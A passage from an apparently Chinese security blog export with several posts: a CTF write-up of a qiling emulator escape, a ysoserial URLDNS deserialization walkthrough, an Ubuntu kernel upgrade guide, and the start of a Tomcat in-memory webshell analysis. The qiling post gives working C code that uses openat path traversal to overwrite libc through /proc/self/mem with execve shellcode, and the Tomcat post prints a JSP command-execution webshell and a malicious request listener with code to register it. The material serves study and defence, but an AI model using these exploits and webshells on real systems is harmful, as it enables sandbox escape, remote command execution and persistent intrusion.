                        if self.ql.archtype == QL_ARCH.ARM and entry_address &amp; 1 == 1:
                            entry_address -= 1
                        self.ql.emu_start(self.ql.loader.entry_point, entry_address, self.ql.timeout)
                        self.ql.enable_lib_patch()
                        self.run_function_after_load()
                        self.ql.loader.skip_exit_check = False
                        self.ql.write_exit_trap()

                    self.ql.emu_start(self.ql.loader.elf_entry, self.exit_point, self.ql.timeout, self.ql.count)

看了看emu_start，主要是利用unicorn进行模拟执行的。然后看了看linux OS的初始化，总结下来觉得qiling实现的东西还是很多的，比如自己的os loader，arch，syscall，hook等，以x86_64架构下的linux为例子看其是如何加载自己的syscall的。
        # X8664
        elif self.ql.archtype == QL_ARCH.X8664:
            self.gdtm = GDTManager(self.ql)
            ql_x86_register_cs(self)
            ql_x86_register_ds_ss_es(self)
            self.ql.hook_insn(self.hook_syscall, UC_X86_INS_SYSCALL)
            # Keep test for _cc
            #self.ql.hook_insn(hook_posix_api, UC_X86_INS_SYSCALL)
            self.thread_class = thread.QlLinuxX8664Thread     
            
def hook_syscall(self, ql, intno = None):
        return self.load_syscall()

load_syscall本身比较复杂，通过代码可以看出它都实现了那些syscall，这里的大部门都是直接使用的系统底层的一些syscall，并不是麒麟自己实现的，可以看他的load_syscall函数实现，不过在posix文件夹下的syscall文件夹里面发现其实qiling自己也实现了大量的syscall，这俩种syscall在使用时的区别主要在于要模拟的文件源码中是直接使用的syscall还是类似open的这种函数形式，前者会调用qiling自身实现的，后者则会直接调用对应的系统调用（这块基于推理和调试，不过大致qiling的系统调用就是通过hook进行检测然后通过回调调用对应的代码这样子），调用回溯如下：

其实从上面就可以看出，qiling本身实现的功能还是很多的，比如内存管理，动态模拟不同架构等，但是根据从大佬哪里偷来的经验，首先像python这种高级语言，内存出现问题是很不常见的，大多都是逻辑问题，那么就很可能是实现跟底层系统进行交互的设计出现问题，比如实现的syscall，这也是rwctf的考点。
漏洞分析​以qiling实现的ql_syscall_open为例子：
def ql_syscall_open(ql: Qiling, filename: int, flags: int, mode: int):
    path = ql.os.utils.read_cstring(filename)
    real_path = ql.os.path.transform_to_real_path(path)
    relative_path = ql.os.path.transform_to_relative_path(path)
    flags &amp;= 0xffffffff
    mode &amp;= 0xffffffff

    idx = next((i for i in range(NR_OPEN) if ql.os.fd[i] == 0), -1)
    if idx == -1:
        regreturn = -EMFILE
    else:
        try:
            if ql.archtype== QL_ARCH.ARM and ql.ostype!= QL_OS.QNX:
                mode = 0
            #flags = ql_open_flag_mapping(ql, flags)
            flags = ql_open_flag_mapping(ql, flags)
            ql.os.fd[idx] = ql.os.fs_mapper.open_ql_file(path, flags, mode)
            regreturn = idx
        except QlSyscallError as e:
            regreturn = - e.errno
    ql.log.debug("open(%s, 0o%o) = %d" % (relative_path, mode, regreturn))

    if regreturn &gt;= 0 and regreturn != 2:
        ql.log.debug(f'File found: {real_path:s}')
    else:
        ql.log.debug(f'File not found {real_path:s}')

    return regreturn

首先通过绝对路径获取模拟执行文件在rootfs下的相对路径，然后将flags传递给ql_open_flag_mapping，然后进行open操作，将得到的fd通过idx索引进行一个存储。
其大致的函数调用链如下：

ql_syscall_open –&gt;  open_ql_file —&gt; os.open

    def open_ql_file(self, path, openflags, openmode, dir_fd=None):
        if self.has_mapping(path):
            self.ql.log.info(f"mapping {path}")
            return self._open_mapping_ql_file(path, openflags, openmode)
        else:
            if dir_fd:
                return ql_file.open(path, openflags, openmode, dir_fd=dir_fd)

            real_path = self.ql.os.path.transform_to_real_path(path)
            return ql_file.open(real_path, openflags, openmode)

在open_ql_file这里发现可能存在漏洞，函数首先判断文件是否已经打开过了，然后判断是否存在dir_fd，如果不存在的话会调用transform_to_real_path函数，该函数也是实现模拟器文件系统隔离的一个关键，这里面对符号链接文件进行了多重解析，但是好像没对路径进行判断，应该也会出现链接的目标问题，它返回一个文件在系统上面的真实路径，然后由open打开相关文件。
    def transform_to_real_path(self, path: str) -&gt; str:
        real_path = self.convert_path(self.ql.rootfs, self.cwd, path)

.......

        return str(real_path.absolute())

但是真正的隔离其实是convert_path实现的：
    @staticmethod
    def convert_for_native_os(rootfs: Union[str, Path], cwd: str, path: str) -&gt; Path:
        _rootfs = Path(rootfs)
        _cwd = PurePosixPath(cwd[1:])
        _path = Path(path)

        if _path.is_absolute():
            return _rootfs / QlPathManager.normalize(_path)
        else:
            return _rootfs / QlPathManager.normalize(_cwd / _path.as_posix())

    def convert_path(self, rootfs: Union[str, Path], cwd: str, path: str) -&gt; Path:
        emulated_os = self.ql.ostype
        hosting_os = self.ql.platform_os

        # emulated os and hosting platform are of the same type
        if  (emulated_os == hosting_os) or (emulated_os in QL_OS_POSIX and hosting_os in QL_OS_POSIX):
            return QlPathManager.convert_for_native_os(rootfs, cwd, path)

        elif emulated_os in QL_OS_POSIX and hosting_os == QL_OS.WINDOWS:
            return QlPathManager.convert_posix_to_win32(rootfs, cwd, path)

        elif emulated_os == QL_OS.WINDOWS and hosting_os in QL_OS_POSIX:
            return QlPathManager.convert_win32_to_posix(rootfs, cwd, path)

        else:
            return QlPathManager.convert_for_native_os(rootfs, cwd, path)

这里建立了rootfs，第一步肯定是想到的路径穿越，比如../../../../这种，但是实验发现../../../test也会被拼接成rootfs/test，原因在于convert_for_native_os函数中利用了normalize进行了处理，导致无法进行路径穿越：

    def normalize(path: Union[Path, PurePath]) -&gt; Union[Path, PurePath]:
        # expected types: PosixPath, PurePosixPath, WindowsPath, PureWindowsPath
        assert isinstance(path, (Path, PurePath)), f'did not expect {type(path).__name__!r} here'

        normalized_path = type(path)()

        # remove anchor (necessary for Windows UNC paths) and convert to relative path
        if path.is_absolute():
            path = path.relative_to(path.anchor)

        for p in path.parts:
            if p == '.':
                continue

            if p == '..':
                normalized_path = normalized_path.parent
                continue

            normalized_path /= p

        return normalized_path

符号链接就可以绕过检查，但是遗憾的是qiling没有实现symlink的系统调用，不过，回看open_ql_file的代码可以看出，如果dir_fd存在，那么就可以绕过这些检查，这时候自然就可以想到ql_syscall_openat的实现，这个就很简单，里面也没什么严格的检查，因此就可以实现目录穿越。
漏洞利用​        在实现了目录穿越之后其实问题就变得简单了，我们可以通过/proc/self/maps获取到自身进程的内存信息，然后通过/proc/self/mem实现恶意代码执行，进而完成逃逸，这里展示一个小demo。
#include&lt;stdio.h&gt;
#include&lt;fcntl.h&gt;
#include&lt;string.h&gt;
unsigned char nop[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
unsigned char code[] = "\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x1\x1\x81\x34\x24\x1\x1\x1\x1\x31\xf6\x56\x6a\x8\x5e\x48\x1\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\xf\x5";
int main() {
    char buf[4096] = "0";
    int fd = open("/proc/self/maps", O_RDONLY);
    int fd_mem = open("/proc/self/mem", O_RDWR);
    FILE *fp_map = fdopen(fd, "r");
    unsigned long addr = 0;
    while(1) {
        fgets(buf, sizeof buf, fp_map);
        if (strstr(buf, "r-xp")!=NULL &amp;&amp; strstr(buf, "libc-")) {
            sscanf(buf, "%lx-", &amp;addr);
            break;
        }
    }
    lseek(fd_mem, addr, SEEK_SET);
    for (int i=0; i&lt;150; i++) {
        write(fd_mem, nop, sizeof nop - 1);
    }
    write(fd_mem, code, sizeof code);
    return 0;
}

不过大家可能会好奇，mem的权限为啥允许写入shellcode：

答案可以参考这篇文章：

https://www.anquanke.com/post/id/257350#h2-0

至此，我们其实就拥有了整个攻击链，先进行目录穿越找到/proc/self/mem，然后写入shellcode。
int main() {
    long start_addr;

    // Open mappings
    int map = openat(1, "/proc/self/maps", O_RDONLY);

    // Open Python process memory
    int mem = openat(1, "/proc/self/mem", O_RDWR);
    FILE *fp_map = fdopen(map, "r");

    // Find the first executable mapping for Libc
    char line[4096];
    while (fgets(line, sizeof line, fp_map)) {
        size_t len = strlen(line);
        if (strstr(line, "r-xp") != NULL &amp;&amp; strstr(line, "libc-")) {
            // Retrive start address of mapping
            sscanf(line, "%lx-", &amp;start_addr);
            printf("%lx\n", start_addr);
            break;
        }
    }

    // Seek to the address of the executable mapping for Libc
    lseek(mem, start_addr, SEEK_SET);
    for(int i=0; i &lt; 3; i++) {
        write(mem, nop, sizeof nop -1);
    }
    // Write the payload into the executable mapping
    write(mem, code, sizeof code);
    return 0;
}

shellcode就不贴了，占地方，可以参考上面那个demo里面的。
总结​这个题目本身算是一个容器逃逸的题目，qiling在实现自己的rootfs的时候对系统调用的检测不严格是问题的根源。官方也及时进行了修复：

https://github.com/qilingframework/qiling/pull/1076/commits/6d0fc4a81880abc2984552ccd23497d8832d00fe

]]></content>
      <categories>
        <category>CTF</category>
        <category>容器安全</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>URLDNS调试那些小事</title>
    <url>//post/URLDNS%E8%B0%83%E8%AF%95%E9%82%A3%E4%BA%9B%E5%B0%8F%E4%BA%8B.html</url>
    <content><![CDATA[URLDNS调试那些小事近期在看javaweb相关的知识，ysoserial作为反序列化利用链的神器，想稍微利用它来调试一个简单的urldns利用链，进而了解这个工具。
ysoserial链接：下载地址: https://github.com/frohoff/ysoserial
这里用jdk1.8来编译

编译ysoserial用JIdea打开导入，会自动导入依赖，导入以后可能还会出现pom.xml红色表示找不到对应依赖的情况，这时可以进入依赖文件夹，可能是用于多个版本jar下载到了其他版本，删除版本然后，再重下载即可（俺在这里卡了好久）。
下载好后进入GeneratePayload这个类
进行run，若出现报错可能对应的jar包的版本不对，删除jar包重新下载。
若运行成功后

按下蓝色小闪电，然后package进行编译打包。
target目录下会显示编译好的jar包。
漏洞搭建建立maven项目：
import java.io.FileInputStream;
import java.io.ObjectInputStream;

public class bug {
    public static void main(String[] args) throws Exception {
        FileInputStream inputStream = new FileInputStream("poc.ser");
        ObjectInputStream oi = new ObjectInputStream(inputStream);
        oi.readObject();
        oi.close();
        System.out.println("反序列化完成");

    }
}

ps：漏洞环境不太准确，只是把序列化文件读进去，然后进行反序列化而已。
生成恶意poc：
在http://dnslog.cn/
获得临时域名：0dt3fc.dnslog.cn
 java -jar .\ysoserial-0.0.5-all.jar URLDNS “http://0dt3fc.dnslog.cn" &gt; poc.ser
将poc.ser放在漏洞项目根目录运行即可。

注：这里有一个坑点，要是以powershell去生成poc文件会执行报错，需cmd，可参考：https://gitter.im/frohoff/ysoserial/archives/2017/09/18
调试大致原理是java.util.HashMap 重写了 readObject, 在反序列化时会调用 hash 函数计算 key 的 hashCode.而 java.net.URL 的 hashCode 在计算时会调用 getHostAddress 来解析域名, 从而发出 DNS 请求，常用作无回显情况下验证java反序列漏洞的情况（俺没碰见过，可能是太菜了，或者运气不好哦）。
在URLDNS.java下，作者写了如下利用链：
 *   Gadget Chain:
 *     HashMap.readObject()
 *       HashMap.putVal()
 *         HashMap.hash()
 *           URL.hashCode()
 *

在刚开始会new  HashMap()，

接下来会调用会调用putVal方法，putVal作用在于HashMap放入键值，这里调用了hash方法来处理key

值得关注key.hashCode()方法，

当hashcode==-1时会执行hashCode = handler.hashCode(this);（默认值为-1所以这里不用太在意）
这里调用getHostAddress

他会进行dns的查询。
然后就是一些细节：
在Hashmap的readObject

key是从readObject得到的，说明key应该在writeObject被写入了。
WriteObject最后会调用到internalWriteEntries(s)。

从中可看出，key和value都来自table，即HashMap中table的值。
要修改table一般会调用HashMap的put方法，从而调用putVal，这样就会造成dns请求，会和目标机器的混淆。

这里ysoserial 继承抽象类SilentURLStreamHandler类，重写了openConnection和getHostAddress，
可以直接返回NULL，不会有后续的操作，从而不会dns请求。
知道这些我们也可以通过反射来将poc再写一遍，网上大佬们写的很完善了，俺就不班门弄斧了。
参考：
https://www.yuque.com/pmiaowu/gpy1q8/ygthda
https://baijiahao.baidu.com/s?id=1711619506108128533&amp;wfr=spider&amp;for=pc
https://xz.aliyun.com/t/7157?page=5
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
  </entry>
  <entry>
    <title>Ubuntu 更新内核到指定版本</title>
    <url>//post/Ubuntu20.04%20%E5%8D%87%E7%BA%A7%E9%99%8D%E7%BA%A7%E5%86%85%E6%A0%B8%E5%88%B0%E6%8C%87%E5%AE%9A%E7%89%88%E6%9C%AC.html</url>
    <content><![CDATA[记一次更新内核到5.8.0-33-generic

更新到指定版本查看当前版本$ uname -r
4.15.0-101-generic

$ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 20.04 LTS
Release:        20.04
Codename:       focal

查看当前已经安装的 Kernel Image$ dpkg --get-selections |grep linux-image
linux-image-5.4.0-90-generic                    purge
linux-image-5.8.0-33-generic                    install
linux-image-generic                             install

查询当前软件仓库可以安装的 Kernel Image 版本，如果没有预期的版本，则需要额外配置仓库$ apt-cache search linux | grep linux-image

安装指定版本的 Kernel Image 和 Kernel Header$ sudo apt-get install linux-headers-5.8.0-33-generic linux-image-5.8.0-33-generic

查看当前的Kernel列表$ grep menuentry /boot/grub/grub.cfg
if [ x"${feature_menuentry_id}" = xy ]; then
  menuentry_id_option="--id"
  menuentry_id_option=""
export menuentry_id_option
menuentry 'Ubuntu' --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option 'gnulinux-simple-b986dc3b-6b82-44d5-acb8-6cbad5e357d5' {
submenu 'Advanced options for Ubuntu' $menuentry_id_option 'gnulinux-advanced-b986dc3b-6b82-44d5-acb8-6cbad5e357d5' {
        menuentry 'Ubuntu, with Linux 5.8.0-33-generic' --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option 'gnulinux-5.8.0-33-generic-advanced-b986dc3b-6b82-44d5-acb8-6cbad5e357d5' {
        menuentry 'Ubuntu, with Linux 5.8.0-33-generic (recovery mode)' --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option 'gnulinux-5.8.0-33-generic-recovery-b986dc3b-6b82-44d5-acb8-6cbad5e357d5' {
        menuentry 'Ubuntu, with Linux 5.4.0-90-generic' --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option 'gnulinux-5.4.0-90-generic-advanced-b986dc3b-6b82-44d5-acb8-6cbad5e357d5' {
        menuentry 'Ubuntu, with Linux 5.4.0-90-generic (recovery mode)' --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option 'gnulinux-5.4.0-90-generic-recovery-b986dc3b-6b82-44d5-acb8-6cbad5e357d5' {

修改 Kernel 的启动顺序：如果安装的是最新的版本，那么默认就是首选的；如果安装的是旧版本，就需要修改 grub 配置$ sudo vim /etc/default/grub

# GRUB_DEFAULT=0
GRUB_DEFAULT="Advanced options for Ubuntu&gt;Ubuntu, with Linux 5.8.0-33-generic"

生效配置$ update-grub
$ reboot

删除不需要的Kernel查询不包括当前内核版本的其它所有内核版本$ dpkg -l | tail -n +6| grep -E 'linux-image-[0-9]+'| grep -Fv $(uname -r)
pi  linux-image-5.4.0-90-generic         5.4.0-90.101                      amd64        Signed kernel image generic

Kernel 状态：

rc：表示已经被移除
ii：表示符合移除条件（可移除）
iU：已进入 apt 安装队列，但还未被安装（不可移除）

删除指定的Kerneldpkg --purge linux-image-5.4.0-90-generic

]]></content>
      <categories>
        <category>系统运维</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomcat内存马简析</title>
    <url>//post/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E8%A7%A3%E6%9E%90.html</url>
    <content><![CDATA[Tomcat内存马简析  webshell木马配合webshell管理工具可以方便对于服务器、内网进行进一步的维权、入侵，随着对文件内容查杀、以Ai对流量特征和行为模式的查杀等等手段，普通文件形式的webshell木马可靠性越来越差。也许好不容易绕过waf传上去两分钟不到就被杀掉了，所以攻击方在近些年也慢慢的研发出“无文件”的webshell木马，即内存马。内存马的概念提出比较久的，但走进视野就近几年的事情，每隔一段时间总能看到不少师傅提出新的内存马实现方法，这里简单说下利用JavaWeb的三大组件Servle、Filter、Listener来动态注册内存马的方式。
前置知识  jsp带回显的webshell木马：
&lt;% if(request.getParameter("shell")!=null){
    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("shell")).getInputStream();
    int a = -1;
    byte[] b = new byte[2048];
    out.print("&lt;pre&gt;");
    while((a=in.read(b))!=-1){
        out.print(new String(b));
    }
    out.print("&lt;/pre&gt;");
}
 
%&gt;

request来获得用户请求，当shell字段的get请求存在时，将shell字段的请求信息当作cmd命令去执行，然后执行的结果通过getInputStream()输入流读返回结果，结果读进byte数组中，若有回显，则打印出结果。
  然而现在的内存马则将重点放在注册恶意组件上，对于Tomcat主要通过JavaWeb的Servlet、Filter、Listener这三大组件来实现。简单说下他们的功能：
  1、Servlet来处理客户端请求的动态资源，也就说我们用浏览器跳转后，请求由Servlet接受和处理，并完成响应，其中init方法在于接收客户端的第一次请求，service每次请求都会调用，destroy则是销毁用的。
  2、Filter是拦截器，作用在于拦截请求路径，init在创建Filter对象是调用。doFilter在请求到来，被拦截时执行，destroy就是销毁此对象。
  3、Listener是事件监听器，作用在于当某事件（比如点击等）在特定事件源发生时执行监听器代码，contextInitialized在Servletcontext创建时调用，contextDestroyed则在Servletcontext销毁时调用。
  加载的顺序为Listener-&gt;Filter-&gt;Servlet。
  在基于tomcat编写内存马时经常会遇到它的三个Context，及ServletContext、ApplicationContext、StandardContext，这里简单了解下：
  首先是Servlet，浏览器发送请求，浏览器接受请求后对请求作出处理，而Tomcat作为一个Servlet容器，将请求传给Servlet，并将相应返回给浏览器，而ServletContext就是servlet要实现的接口，比如路径信息或者拦截信息等。
  ApplicationContext的功能则在于实现ServletContext规范，一些对应方法的实现，例如addFilter等功能。
  而在看StandardContext时会发现，ApplicationContext调用的context方法是StandardContext实现的对象，则StandardContext其实是底层与Tomcat底层交互的内容。
Listener内存马  既然加载顺序为Listener-&gt;Filter-&gt;Servlet，那么也根据这个顺序来调试。
  在注册一个listener时因为要匹配不同的事件，常用的分为ServletContextListener、ServletContextAttributeListener、ServletRequestAttributeListener、HttpSessionListener、ServletRequestListener、HttpSessionAttributeListener，一般常用ServletRequestListener来作内存马，因为他可以监听我们任意访问的资源，在访问资源会触发后其requestInitialized方法。
  ServletRequestListener的接口有两个事件处理方法：requestInitialized与requestDestroyed， requestInitialized(ServletRequestEvent sre)在与接受对应类型的参数，通过此参数来获得创建的对象；requestDestroyed(ServletRequestEvent sre)则是参数对象销毁时，调用此方法。知道这些就可以创建一个恶意Listener类：
@WebListener
public class ListenerShell implements ServletRequestListener {
    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
        String command = req.getParameter("cmd");
        if (command != null) {
            try {
                InputStream in = Runtime.getRuntime().exec(command).getInputStream();
            } catch (IOException e) {
                e.printStackTrace();
            } catch (NullPointerException n) {
                n.printStackTrace();
            }
        }
    }
    @Override
    public void requestDestroyed(ServletRequestEvent sre) {
    }
}

  其中HttpServletRequest代表浏览器请求，HTTP的所有信息都封装在此对象中，也就是可以从中得到请求信息，后面的就是请求读取请求命令和执行命令了。访问任意路由即可执行命令。接下来我们进行debug调试，从而知道他如何添加进去的。在我们添加的
public class ListenerShell implements ServletRequestListener {

处下断点，查看调用栈：
&lt;init&gt;:11, ListenerShell (com.Listener)
newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)
newInstance:62, NativeConstructorAccessorImpl (sun.reflect)
newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)
newInstance:423, Constructor (java.lang.reflect)
newInstance:150, DefaultInstanceManager (org.apache.catalina.core)
listenerStart:4691, StandardContext (org.apache.catalina.core)
.....

其中listenerStart我们跟进去看下
    public boolean listenerStart() {
        if (log.isDebugEnabled()) {
            log.debug("Configuring application event listeners");
        }

        String[] listeners = this.findApplicationListeners();
        Object[] results = new Object[listeners.length];
        boolean ok = true;

        for(int i = 0; i &lt; results.length; ++i) {
            if (this.getLogger().isDebugEnabled()) {
                this.getLogger().debug(" Configuring event listener class '" + listeners[i] + "'");
            }

            try {
                String listener = listeners[i];
                results[i] = this.getInstanceManager().newInstance(listener);
            }
    ......

其中findApplicationListeners方法就是将我们要注册的Listener传入该方法中，其中这里demo的值为com.Listener.ListenerShell，与写代码的文件目录一致。后面将对象信息传入results里，接下来对于类型进行分类
                if (lifecycleListener instanceof ServletContextAttributeListener || lifecycleListener instanceof ServletRequestAttributeListener || lifecycleListener instanceof ServletRequestListener || lifecycleListener instanceof HttpSessionIdListener || lifecycleListener instanceof HttpSessionAttributeListener) {
                    eventListeners.add(lifecycleListener);
                }

因为这里实现的是ServletRequestListener，所以分到eventListeners数组中然后调用了getApplicationEventListeners
            eventListeners.addAll(Arrays.asList(this.getApplicationEventListeners()));
            this.setApplicationEventListeners(eventListeners.toArray());

   public Object[] getApplicationEventListeners() {
        return this.applicationEventListenersList.toArray();
    }

其中返回的applicationEventListenersList，为已经注册的Listener，
    public void setApplicationEventListeners(Object[] listeners) {
        this.applicationEventListenersList.clear();
        if (listeners != null &amp;&amp; listeners.length &gt; 0) {
            this.applicationEventListenersList.addAll(Arrays.asList(listeners));
        }

    }

setApplicationEventListeners主要完成applicationEventListenersList清空和重新赋值的操作，我们注册的Listener就存储在此。接下来我们去考虑Listener是如何触发的，此时我们在
    public void requestInitialized(ServletRequestEvent sre) {

下断点进行调试，并用浏览器访问路由，打开debug，在调用栈中看到
requestInitialized:14, ListenerShell (com.Listener)
fireRequestInitEvent:5992, StandardContext (org.apache.catalina.core)
invoke:121, StandardHostValve (org.apache.catalina.core)
......

进入fireRequestInitEvent中：
    public boolean fireRequestInitEvent(ServletRequest request) {
        Object[] instances = this.getApplicationEventListeners();
        if (instances != null &amp;&amp; instances.length &gt; 0) {
            ServletRequestEvent event = new ServletRequestEvent(this.getServletContext(), request);
            Object[] var4 = instances;
            int var5 = instances.length;

            for(int var6 = 0; var6 &lt; var5; ++var6) {
                Object instance = var4[var6];
                if (instance != null &amp;&amp; instance instanceof ServletRequestListener) {
                    ServletRequestListener listener = (ServletRequestListener)instance;

                    try {
                        listener.requestInitialized(event);
                    } catch (Throwable var10) {
                        ExceptionUtils.handleThrowable(var10);
                        this.getLogger().error(sm.getString("standardContext.requestListener.requestInit", new Object[]{instance.getClass().getName()}), var10);
                        request.setAttribute("javax.servlet.error.exception", var10);
                        return false;
                    }
                }
            }
        }

        return true;
    }

代码中获得Listener的方法也是调用了getApplicationEventListeners来获取，然后遍历数组，当是要调用的事件型监听器时，用listener.requestInitialized(event)将其触发。
  现在知道Listener怎么存储了触发了，但我们还要知道如何添加Listener，这里说两种方案：
  第一种，通过setApplicationEventListeners将Listener添加到数组中。
  第二种，通过addApplicationEventListener方法来添加。
  不管哪种方案，第一步肯定是获得StandardContext类，在上面的调用栈中可以看到调用了StandardHostValve的invoke方法，我们看下：
    public final void invoke(Request request, Response response) throws IOException, ServletException {
        Context context = request.getContext();

那么我们也可以通过request来获取StandardContext。获取后我们就分别说下添加Listener的两种方案：
  第一种，通过getApplicationEventListeners获取的StandardContext中的Listener数组，并将添加我们创建的listener进去，再setApplicationEventListeners数组即可：
    Object[] objects = context.getApplicationEventListeners();
    List&lt;Object&gt; listeners = Arrays.asList(objects);
    List&lt;Object&gt; listenershelllist = new ArrayList(listeners);
    ListenerShell listenershell = new ListenerShell;
    listenershelllist.add(listenershell);
    context.setApplicationEventListeners(listenershelllist.toArray());

  第二种，StandardContext中有addApplicationEventListener方法，可以直接添加Listener：
    ListenerShell listenershell = new ListenerShell;
    context.addApplicationEventListener(listenershell);

附上第一种的完整代码：
&lt;%@ page contentType="text/html;charset=UTF-8" language="java" %&gt;
&lt;%@ page import="java.lang.reflect.Field" %&gt;
